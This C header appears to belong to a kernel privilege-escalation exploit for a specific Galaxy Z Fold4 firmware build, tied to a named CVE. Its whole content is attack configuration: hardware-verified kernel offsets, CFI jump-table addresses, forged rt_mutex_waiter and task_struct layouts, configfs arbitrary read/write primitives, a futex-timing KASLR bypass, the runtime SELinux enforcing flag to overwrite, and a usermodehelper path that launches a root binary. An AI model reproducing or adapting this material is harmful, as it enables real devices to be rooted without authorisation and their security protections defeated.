#ifndef OFFSET_H
#define OFFSET_H

/*
 * q4q (SM-F9360 Galaxy Z Fold4) — F9360ZCSAIZF1 (CHC)
 * kernel: 5.10.236-android12-9-2755199-abF9360ZCSAIZF1 (2026-06-16 build)
 * Android 16, SPL 2026-05-05, Snapdragon 8+ Gen 1 (SM8450)
 *
 * Device-verified: 2026-08-12 full chain + 2026-09-01 re-verification
 * (attempt-1 success). All offsets extracted from the exact firmware
 * kernel Image (vmlinux-to-elf) and cross-checked on hardware
 * (SM8450 = b0q family, same SoC as S22U).
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "q4q-F9360ZCSAIZF1-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
/* Root My Galaxy app payload: must use the fresh-P0 session path (same as
 * e1s/e2s). q4q has CONFIG_ARM64_MTE=y + KASAN_HW_TAGS=y; the non-fresh
 * path hardcodes mte=0 and cannot pass. */
#define APP_REQUIRE_FRESH_P0_SESSION 1
#else
#define BUILD_VARIANT_LABEL "q4q-F9360ZCSAIZF1-root-umh"
#endif

/* ---- Kernel image layout (F9360ZCSAIZF1, device-verified) ---- */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET   0xffffff8000000000ULL   /* 39-bit VA PAGE_OFFSET     */
#define P0_PHYS_OFFSET   0x80000000ULL           /* memstart_addr             */
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL        /* b0q/SM8450 真机验证 (S22U 同 SoC); 0x80080000 读错 uefi literal */

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL   /* 64GB direct map */
#define DIRECT_MAP_BASE  0xffffff8000000000ULL
#define DIRECT_MAP_END   0xffffff9000000000ULL
#define VMEMMAP_START    0xfffffffeffe00000ULL   /* 39-bit v5.10: -VMEMMAP_SIZE(0x1000000000)-2M; GDB-verified on live slab pages */

/* ---- ashmem dispatch functions (CFI jump targets for v5.10 ARM64 Android) ---- */
#define ASHMEM_MISC_FOPS_OFF 0x026db7a8ULL   /* &ashmem_misc.fops */
#define ASHMEM_FOPS_OFF      0x02078cb8ULL   /* &ashmem_fops           */

/* Function addresses (raw entry points) */
#define ASHMEM_IOCTL_OFF         0x01115d58ULL   /* ashmem_ioctl           */
#define ASHMEM_COMPAT_IOCTL_OFF  0x01116824ULL   /* compat_ashmem_ioctl    */
#define ASHMEM_MMAP_OFF          0x0111687cULL   /* ashmem_mmap            */
#define ASHMEM_OPEN_OFF          0x01116aacULL   /* ashmem_open            */
#define ASHMEM_RELEASE_OFF       0x01116b44ULL   /* ashmem_release         */
#define ASHMEM_SHOW_FDINFO_OFF   0x01116c60ULL   /* ashmem_show_fdinfo     */

/*
 * configfs — v5.10 uses old .read/.write API, not .read_iter/.write_iter.
 * The arbitrary-READ primitive forges configfs_buffer->page (off 16) and
 * ->count (off 0, = ASHMEM_PREFIX_COUNT from the fixed name prefix), so the
 * .read slot MUST be configfs_read_file (text path, consumes page/count).
 * configfs_read_bin_file consumes ->bin_buffer (left NULL on reads) and
 * returns 0 — using it in the .read slot causes "cfi misc_fops mismatch
 * ret=0 read=0".
 * The arbitrary-WRITE primitive forges ->bin_buffer/->bin_buffer_size, so the
 * .write slot MUST be configfs_write_bin_file.
 * Populate .read/.write (FOPS_READ_OFF=0x10, FOPS_WRITE_OFF=0x18).
 */
#define CONFIGFS_READ_ITER_OFF      0x006040d8ULL   /* configfs_read_file      */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00604a68ULL   /* configfs_write_bin_file */

#define COPY_SPLICE_READ_OFF  0x0053866cULL   /* generic_file_splice_read */
#define NOOP_LLSEEK_OFF       0x004c3694ULL   /* noop_llseek              */

/* ---- Kernel data objects ---- */
#define INIT_TASK_OFF           0x0258c000ULL   /* init_task           */
#define ROOT_TASK_GROUP_OFF     0x0278a040ULL   /* root_task_group     */
/* Runtime enforce flag = selinux_state.enforcing @ +0x00
 * (selinux_state @ 0xffffffc00a8cccd8; offset verified via sel_write_enforce's
 * ldaprb/strb [x22]).  NOT selinux_enforcing_boot (0x02548484) — that one is
 * the boot-time value only; writing it changes nothing at runtime (the
 * 2026-08-08 device run's umh -EACCES: SELinux stayed enforcing). */
#define SELINUX_ENFORCING_OFF   0x028bba68ULL   /* selinux_state.enforcing */
#define KMALLOC_CACHES_OFF      0x020baea0ULL   /* kmalloc_caches      */
#define ANON_PIPE_BUF_OPS_OFF   0x01efc028ULL   /* anon_pipe_buf_ops   */

/* ---- Convenience macros (absolute addresses) ---- */
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER       (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER  (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ   (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK        (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK          (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP    (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING  (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES     (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ---- Root usermodehelper ---- */
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001086b4ULL   /* GDB: &call_usermodehelper_exec_work - KIMAGE_TEXT_BASE */
#define SYSTEM_UNBOUND_WQ_OFF 0x02579e08ULL               /* GDB: &system_unbound_wq - KIMAGE_TEXT_BASE */

/* ---- kCFI canonical (.cfi_jt) addresses ---------------------------------
 * CONFIG_CFI_CLANG is on: function pointers called indirectly (fops slots,
 * work funcs) MUST be the canonical .cfi_jt jump-table entries, NOT the raw
 * kallsyms addresses — misc_open's f_op->open call panics with
 * "CFI failure" otherwise (observed on the live target).
 * Values recovered by scanning the .cfi_jt region on the running kernel and
 * cross-checked against the real ashmem_fops table slots. */
#define ASHMEM_IOCTL_JT_OFF           0x01115d58ULL   /* -> ashmem_ioctl            */
#define ASHMEM_COMPAT_IOCTL_JT_OFF    0x01116824ULL   /* -> compat_ashmem_ioctl     */
#define ASHMEM_MMAP_JT_OFF            0x0111687cULL   /* -> ashmem_mmap             */
#define ASHMEM_OPEN_JT_OFF            0x01116aacULL   /* -> ashmem_open             */
#define ASHMEM_RELEASE_JT_OFF         0x01116b44ULL   /* -> ashmem_release          */
#define ASHMEM_SHOW_FDINFO_JT_OFF     0x01116c60ULL   /* -> ashmem_show_fdinfo      */
#define ASHMEM_LLSEEK_JT_OFF          0x01115bb8ULL   /* real table .llseek (ashmem_llseek) */
#define CONFIGFS_READ_FILE_JT_OFF       0x006040d8ULL /* -> configfs_read_file      */
#define CONFIGFS_WRITE_BIN_FILE_JT_OFF  0x00604a68ULL /* -> configfs_write_bin_file */
#define NOOP_LLSEEK_JT_OFF            0x004c3694ULL   /* -> noop_llseek             */
#define CALL_USERMODEHELPER_EXEC_WORK_JT_OFF 0x001086b4ULL /* -> call_usermodehelper_exec_work */

#define ASHMEM_IOCTL_JT        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_JT_OFF)
#define ASHMEM_COMPAT_IOCTL_JT (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_JT_OFF)
#define ASHMEM_MMAP_JT         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_JT_OFF)
#define ASHMEM_OPEN_JT         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_JT_OFF)
#define ASHMEM_RELEASE_JT      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_JT_OFF)
#define ASHMEM_SHOW_FDINFO_JT  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_JT_OFF)
#define ASHMEM_LLSEEK_JT       (KIMAGE_TEXT_BASE + ASHMEM_LLSEEK_JT_OFF)
#define CONFIGFS_READ_FILE_JT       (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_JT_OFF)
#define CONFIGFS_WRITE_BIN_FILE_JT  (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_BIN_FILE_JT_OFF)
#define NOOP_LLSEEK_JT         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_JT_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK_JT \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_JT_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* ---- SKB delta (unix sendmsg / alloc_skb_with_frags) ----
 * GDB-verified on the live b0q kernel (unix_stream_sendmsg+344..432):
 *   size = min(len-sent, (sk->sk_sndbuf>>1)-64, 36480)   per-skb cap
 *   head = size - PAGE_ALIGN(size - 0xe80)  →  header_len = 0xe80
 *   x1=0xe80 (header_len), x2=0x8000 (data_len) → sock_alloc_send_pskb
 * So each skb carries 36480 B: 0xe80 B linear head + one 32 KB order-3 frag
 * page that receives the user stream at offset 0xe80 — device-verified on
 * q4q (matches the generic 5.10 GKI behavior).  Payload pointers must be
 * biased by -0xe80 so they land on
 * their content inside the frag page.  (An earlier "header_len=size/2"
 * reading mistook the sndbuf>>1 limit for the head size — reverted.) */
#ifndef SKB_DATA_DELTA
#define SKB_DATA_DELTA (-0xe80LL)
#endif

/* ---- SLIDE KASLR bypass offsets ---- */
/*
 * nfulnl_logger, loggers array, random boot_id data, init_task, root_task_group,
 * and sysctl_bootid — used by SLIDE KASLR bypass.
 * TraceFS-based slide (SLIDE_TRACEFS_WORKER_CALLER) targets the return
 * address from worker_thread's bl schedule call site; device-verified
 * on q4q hardware (slide varies per boot, e.g. 0x18000 / 0x1c8000).
 */
#define SLIDE_FAKE_WAITER_PRIO   0
#define SLIDE_WAITER_WAKE_STATE  0
#define SLIDE_LOCK_OWNER_VALUE   1ULL
#define SLIDE_USE_FAKE_TASK      1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_TRACEFS_EVENT_ID 84
#define SLIDE_PSELECT_WORD_SHIFT 0
/* 5.10: waiter qword 0 overlaps the first fd-set qword (A155N derivation).
 * e2s=3 is the 6.1 value — do not copy across kernel versions. */
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

/* rmg-payloads convention: NAME = nfnetlink_log string, OBJECT = nfulnl_logger
 * struct, RANDOM_TABLE_BOOT_ID_DATA_PTR = &random_table[4].data.
 * NAME verified against the exact Image (string "nfnetlink_log" at
 * kbase+0x01df69a5); OBJECT verified via nm (nfulnl_logger @
 * 0xffffffc00a581340) and live slide_logger=...340 on device. */
#define SLIDE_NFULNL_LOGGER_NAME_OFF          0x01df69a5ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF        0x02581340ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0269b5d0ULL
#define SLIDE_INIT_TASK_OFF            INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF      ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF        0x0295bac5ULL   /* sysctl_bootid buffer */

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/*
 * TraceFS worker caller offset — the return address from worker_thread's
 * bl schedule (0xffffffc00815c244 -> LR = 0xffffffc00815c248).
 * Used by slide.c to match trace event callers during KASLR bypass.
 * Device-verified on q4q.
 */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00112ae0ULL   /* worker_thread+1368 ret addr after bl schedule */

/* ---- Fake page layout offsets (within the 32KB order-3 kernel page) ---- */
#define LOCK_OFF    0x1350
#define W0_OFF      0x2220
#define FOPS_OFF    0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF   0x4440
#define LEFT_OFF    0x5550
#define FAKE_TASK_OFF 0x3200

/* ---- rt_mutex_waiter embedded offsets (v5.10 via GDB ptype) ---- */
/*
 * v5.10 struct rt_mutex_waiter = 80 bytes (NO wake_state, NO ww_ctx).
 * Layout: tree_entry(0) pi_tree_entry(24) task(48) lock(56) prio(64) deadline(72)
 */
#define FAKE_WAITER_TREE_PRIO_OFF       0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18   /* v5.10: pi_tree_entry at 24 (0x18), NOT 0x28 like v6.x */
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF            0x30   /* v5.10: task at 0x30 (was 0x50 in v6.x) */
#define FAKE_WAITER_LOCK_OFF            0x38   /* v5.10: lock at 0x38 (was 0x58 in v6.x) */
#define FAKE_WAITER_WAKE_STATE_OFF      0x60   /* v5.10: field absent; harmless write past struct */
#define FAKE_WAITER_WW_CTX_OFF          0x68   /* v5.10: field absent; harmless write past struct */

/* ---- task_struct internal offsets (v5.10 via GDB ptype) ---- */
#define FAKE_TASK_USAGE_OFF         0x40    /* &task->usage         */
#define FAKE_TASK_PRIO_OFF          0x84    /* &task->prio          */
#define FAKE_TASK_NORMAL_PRIO_OFF   0x8c    /* &task->normal_prio   */
#define FAKE_TASK_TASK_GROUP_OFF    0x310   /* &task->sched_task_group */
#define FAKE_TASK_PI_LOCK_OFF       0x86c   /* &task->pi_lock       */
#define FAKE_TASK_PI_WAITERS_OFF    0x880   /* &task->pi_waiters    */
#define FAKE_TASK_PI_TOP_TASK_OFF   0x890   /* &task->pi_top_task   */
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898   /* &task->pi_blocked_on */

/* ---- configfs buffer-private overlay offsets ---- */
#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

/* ---- workqueue_struct (v5.10 via GDB ptype) ---- */
#define WQ_DFL_PWQ_OFF 0xb0      /* &((struct workqueue_struct *)0)->dfl_pwq */

/* ---- pool_workqueue offsets (v5.10 via GDB ptype, sizeof=256) ---- */
#define PWQ_POOL_OFF         0x00   /* &pwq->pool          */
#define PWQ_WQ_OFF           0x08   /* &pwq->wq            */
#define PWQ_WORK_COLOR_OFF   0x10   /* &pwq->work_color    */
#define PWQ_REFCNT_OFF       0x18   /* &pwq->refcnt        */
#define PWQ_NR_IN_FLIGHT_OFF 0x1c   /* &pwq->nr_in_flight[0] */
#define PWQ_NR_ACTIVE_OFF    0x58   /* &pwq->nr_active     */   /* v5.10: nr_in_flight[15], NOT [16] */
#define PWQ_MAX_ACTIVE_OFF   0x5c   /* &pwq->max_active    */

/* ---- worker_pool offsets (v5.10 via GDB ptype, sizeof=896) ---- */
#define POOL_WORKLIST_OFF 0x20   /* &pool->worklist   */   /* v5.10: watchdog_ts at 0x18 adds 8 bytes */
#define POOL_NR_IDLE_OFF  0x34   /* &pool->nr_idle     */

/* ---- work_struct offsets (v5.10 via GDB ptype, sizeof=48) ---- */
#define WORK_DATA_OFF  0x00   /* &work->data    */
#define WORK_ENTRY_OFF 0x08   /* &work->entry   */
#define WORK_FUNC_OFF  0x18   /* &work->func    */

/* ---- struct page (v5.10 via GDB ptype, sizeof=64=0x40) ---- */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x18   /* &page->slab_cache (union w/ mapping); was 0x08 in v6.x */
#define STRUCT_PAGE_TYPE_OFF          0x30

/* ---- pipe buffer ---- */
#define PIPE_BUFFER_SLOTS         32
#define PIPE_BUF_FLAG_CAN_MERGE   0x10

/* ---- file_operations offsets (v5.10 via GDB ptype, sizeof=288=0x120) ---- */
/* v5.10 has BOTH .read/.write AND .read_iter/.write_iter — all shifted by 8 vs v6.x */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x50   /* unlocked_ioctl  (was 0x48 in v6.x) */
#define FOPS_COMPAT_IOCTL_OFF 0x58   /* compat_ioctl    (was 0x50 in v6.x) */
#define FOPS_MMAP_OFF         0x60   /* mmap            (was 0x58 in v6.x) */
#define FOPS_OPEN_OFF         0x70   /* open            (was 0x68 in v6.x) */
#define FOPS_RELEASE_OFF      0x80   /* release         (was 0x78 in v6.x) */
#define FOPS_SPLICE_READ_OFF  0xC8   /* splice_read     (was 0xB8 in v6.x) */
#define FOPS_SHOW_FDINFO_OFF  0xE0   /* show_fdinfo     (was 0xD8 in v6.x) */

/* ---- v5.10 struct size overrides (included before common.h) ---- */
#define MM_STRUCT_SZ       960    /* 0x3C0: v5.10 mm_struct slab size, was 0x500 */
#define MM_CPU_PARTIAL     13      /* GDB: mm_cachep->cpu_partial on qemu v5.10 */
#define KSNITCH_COLLISIONS 6      /* v5.10 needs more collisions, was 4 */
/* q4q: futex_init = roundup_pow_of_two(256*num_possible_cpus()) = 2048
 * (SM8450 8 physical cores; sysconf 报 16 在线核 → 默认 4096 会 hash 失配!
 * 内核源码 futex.c 验证过, 必须强制 2048) */
#define KERNELSNITCH_FUTEX_HASH_SIZE 2048

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 500000000L
/* e1s/e2s (S24U 12GB, 真机验证) 同步护栏 — 防 requeue race panic:
 * consumer 先确认 waiter 真阻塞在 pselect (wchan=do_select) 再触发 sched_setattr,
 * 且 pselect 年龄不超过 150ms (避免在错误窗口触发导致 fake 树遍历崩溃) */
#define SLIDE_SYNC_PSELECT_SYSCALL 1
#define SLIDE_GUARD_PSELECT_SYSCALL 1
#define SLIDE_PSELECT_READY_TIMEOUT_USEC 20000
#define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 20000
#define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
#define APP_PSELECT_POST_GUARD_AGE_CHECK 1
#define APP_PSELECT_TRIGGER_MAX_AGE_USEC 150000
/* 1024, not 2048: matches the device-verified root-UMH supervisor tuning
 * (recipe §6: 4096->1024). 2048 also breaks F_SETPIPE_SZ under the
 * unprivileged pipe-max-size cap on device. Note: the APP_PAYLOAD route
 * itself is still unproven on q4q hardware (KernelSnitch-stage panic;
 * see docs/SM-F9360-F9360ZCSAIZF1.md) — this value only aligns the app
 * build with the proven supervisor configuration. */
#define SLIDE_KSNITCH_APPENDED_FUTEXES 1024
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/q4q-F9360ZCSAIZF1/p0_fingerprint.h"
#endif

#endif
